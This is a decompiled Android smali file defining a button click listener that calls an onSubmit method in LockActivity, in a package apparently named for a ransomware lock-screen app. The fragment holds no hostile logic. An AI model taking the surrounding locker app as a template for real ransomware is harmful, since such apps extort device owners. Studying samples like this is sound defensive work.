.class Lcom/kithub/ransomlock/LockActivity$1;
.super Ljava/lang/Object;
.source "LockActivity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/kithub/ransomlock/LockActivity;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/kithub/ransomlock/LockActivity;


# direct methods
.method constructor <init>(Lcom/kithub/ransomlock/LockActivity;)V
    .locals 0
    .param p1, "this$0"    # Lcom/kithub/ransomlock/LockActivity;
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 53
    iput-object p1, p0, Lcom/kithub/ransomlock/LockActivity$1;->this$0:Lcom/kithub/ransomlock/LockActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 1
    .param p1, "v"    # Landroid/view/View;

    .line 56
    iget-object v0, p0, Lcom/kithub/ransomlock/LockActivity$1;->this$0:Lcom/kithub/ransomlock/LockActivity;

    invoke-static {v0}, Lcom/kithub/ransomlock/LockActivity;->-$$Nest$monSubmit(Lcom/kithub/ransomlock/LockActivity;)V

    .line 57
    return-void
.end method
